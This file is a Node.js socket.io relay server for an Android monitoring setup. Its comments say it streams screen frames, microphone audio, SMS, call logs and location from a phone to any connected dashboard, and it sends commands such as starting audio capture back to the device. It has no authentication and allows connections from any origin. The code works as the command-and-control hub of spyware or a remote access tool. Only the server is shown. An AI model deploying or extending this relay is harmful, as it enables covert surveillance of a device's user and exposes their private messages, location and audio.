const http = require('http');
const { Server } = require('socket.io');

const server = http.createServer();
const io = new Server(server, {
    cors: {
        origin: "*", // Allows your HTML dashboard to connect from any source
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e7 // Increases buffer size to 10MB for high-res screen frames
});

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // 1. RECEIVE DATA FROM ANDROID
    // Screen frames
    socket.on('data-stream', (base64Data) => {
        // Broadcast to all connected dashboards
        socket.broadcast.emit('data-stream', base64Data);
    });

    // Audio chunks
    socket.on('audio-stream', (audioBase64) => {
        socket.broadcast.emit('audio-stream', audioBase64);
    });

    // SMS/Call Logs/Location
    socket.on('device-data', (payload) => {
        socket.broadcast.emit('device-data', payload);
    });

    // 2. RECEIVE COMMANDS FROM DASHBOARD
    socket.on('command', (cmd) => {
        console.log('Sending command to device:', cmd);
        // This sends the command (e.g., 'start-audio') to the Android app
        socket.broadcast.emit('command', cmd);
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });
});

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Your Dashboard IP is: http://YOUR_LOCAL_IP:${PORT}`);
});
